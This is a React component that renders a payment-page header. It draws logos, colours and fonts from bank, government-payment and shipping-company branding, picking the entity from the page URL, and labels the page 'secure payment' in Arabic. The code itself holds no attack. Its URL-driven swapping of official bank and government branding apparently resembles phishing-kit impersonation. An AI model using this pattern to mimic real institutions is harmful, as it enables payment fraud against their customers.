import React from 'react';
import { ArrowLeft } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { getServiceBranding } from '@/lib/serviceLogos';
import { shippingCompanyBranding, bankBranding } from '@/lib/brandingSystem';
import { getGovernmentPaymentSystem } from '@/lib/governmentPaymentSystems';
import { detectEntityFromURL, getEntityLogo } from '@/lib/dynamicIdentity';
import BrandedCarousel from '@/components/BrandedCarousel';

interface BrandedTopBarProps {
  serviceKey: string;
  serviceName: string;
  showBackButton?: boolean;
  backPath?: string;
  bankId?: string;
  countryCode?: string;
  showCarousel?: boolean;
}

const BrandedTopBar: React.FC<BrandedTopBarProps> = ({
  serviceKey,
  serviceName,
  showBackButton = true,
  backPath,
  bankId,
  countryCode,
  showCarousel = false
}) => {
  const navigate = useNavigate();
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  const selectedBankBranding = bankId ? bankBranding[bankId] : null;
  const govSystem = countryCode ? getGovernmentPaymentSystem(countryCode) : null;

  const detectedEntity = detectEntityFromURL();
  const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;

  // Priority: Bank branding > Government system > Company branding
  const activeBranding = selectedBankBranding || (serviceKey === 'payment' && govSystem ? {
    colors: govSystem.colors,
    fonts: { arabic: govSystem.fonts.primaryAr, primary: govSystem.fonts.primary, secondary: govSystem.fonts.secondary },
    gradients: govSystem.gradients,
    shadows: govSystem.shadows,
    borderRadius: govSystem.borderRadius
  } : companyBranding);
  
  const primaryColor = activeBranding?.colors.primary || branding.colors.primary;
  const secondaryColor = activeBranding?.colors.secondary || branding.colors.secondary;
  
  const gradient = activeBranding?.gradients?.header || activeBranding?.gradients?.primary || `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`;

  const displayLogo = entityLogo || 
                      ((govSystem?.logo && serviceKey === 'payment') ? govSystem.logo : branding.logo);

  const handleBack = () => {
    if (backPath) {
      navigate(backPath);
    } else {
      navigate(-1);
    }
  };

  return (
    <>
      <div 
        className="sticky top-0 z-50 w-full shadow-lg"
        style={{
          background: gradient,
          borderBottom: `2px solid ${primaryColor}`,
          boxShadow: '0 4px 12px rgba(0,0,0,0.1)'
        }}
      >
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between h-14 sm:h-16">
            {/* Right side - Logo & Service Name */}
            <div className="flex items-center gap-2 sm:gap-3">
              {displayLogo && (govSystem && serviceKey === 'payment' ? (
                <div className="p-1.5 sm:p-2">
                  <img 
                    src={displayLogo} 
                    alt={serviceName}
                    className="h-7 sm:h-9 w-auto object-contain"
                  />
                </div>
              ) : (
                <img 
                  src={displayLogo} 
                  alt={serviceName}
                  className="h-8 sm:h-10 w-auto object-contain brightness-0 invert"
                />
              ))}
              <div className="text-white">
                <h2 
                  className="text-base sm:text-xl font-bold leading-tight"
                  style={{ fontFamily: activeBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }}
                >
                  {serviceName}
                </h2>
                <p 
                  className="text-[10px] sm:text-xs opacity-90 hidden sm:block"
                  style={{ fontFamily: activeBranding?.fonts.primary || 'Arial, sans-serif' }}
                >
                  {govSystem?.description || "الدفع الآمن"}
                </p>
              </div>
            </div>

            {/* Left side - Back button */}
            {showBackButton && (
              <button
                onClick={handleBack}
                className="flex items-center gap-2 text-white hover:bg-white/10 px-3 sm:px-4 py-2 rounded-lg transition-all"
                style={{ fontFamily: activeBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }}
              >
                <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5" />
                <span className="text-sm sm:text-base font-medium">رجوع</span>
              </button>
            )}
          </div>
        </div>

        {/* Optional bottom gradient line - hide for gov */}
        <div 
          className="h-1 w-full"
          style={{
            background: `linear-gradient(90deg, ${primaryColor}, ${secondaryColor}, ${primaryColor})`
          }}
        />
      </div>

      {/* Branded Carousel - shown when showCarousel is true and company has branding */}
      {showCarousel && companyBranding && (
        <div className="w-full bg-gradient-to-b from-gray-50 to-white py-6">
          <div className="container mx-auto px-4">
            <BrandedCarousel serviceKey={serviceKey} />
          </div>
        </div>
      )}
    </>
  );
};

export default BrandedTopBar;
